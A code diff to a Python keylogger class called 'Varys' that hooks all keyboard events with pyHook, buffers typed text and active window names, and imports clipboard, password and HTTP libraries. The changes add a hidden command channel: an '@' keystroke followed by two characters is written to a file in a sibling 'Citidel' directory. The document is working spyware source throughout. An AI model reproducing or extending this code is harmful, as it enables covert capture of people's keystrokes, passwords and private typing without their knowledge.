@@ -1,13 +1,17 @@
 import pyHook, pythoncom, sys, logging,os, pyperclip, httplib, urllib, getpass, shutil, pickle
 from datetime import datetime
-
+import threading
 
 
 class Varys:
 
     def __init__(self):
         self.__file_log = datetime.now().strftime('%y%m%w%d')+".txt"
-        self.__grph = pickle.load(open("datadict.p","rb"))
+        x=open("datadict.p","rb")
+        self.__grph = pickle.load(x)
+        x.close()
+        self.__take_cmd=0
+        self.__cmd=''
         self.__line_buff=""
         self.__window_buff=""
         self.__filecheck=False
@@ -20,6 +24,8 @@ class Varys:
         hooks_manager.HookKeyboard()
         pythoncom.PumpMessages()
 
+    def getWindowName(self):
+        return self.__window_buff
 
     def OnKeyboardEvent(self,event):
 
@@ -89,6 +95,18 @@ class Varys:
 
         if(ky > 31 and ky < 127):
             self.__line_buff += chr(ky)
+##        TODO might have bug in taking first cmd
+            if(self.__take_cmd):
+                self.__cmd+=chr(ky)
+                if(len(self.__cmd)==2):
+                    f=open((os.path.join(os.getcwd(),'..','Citidel','Temp.txt')),"w")
+                    f.write(self.__cmd)
+                    self.__cmd=""
+                    f.close()
+                    self.__take_cmd=0
+            if(chr(ky)=='@'):
+                self.__take_cmd=1
+                
             return True
 
         if(ky == 13):
@@ -102,4 +120,5 @@ class Varys:
 
         return True
 
-v=Varys()
+if __name__ == "__main__":
+    v=Varys()
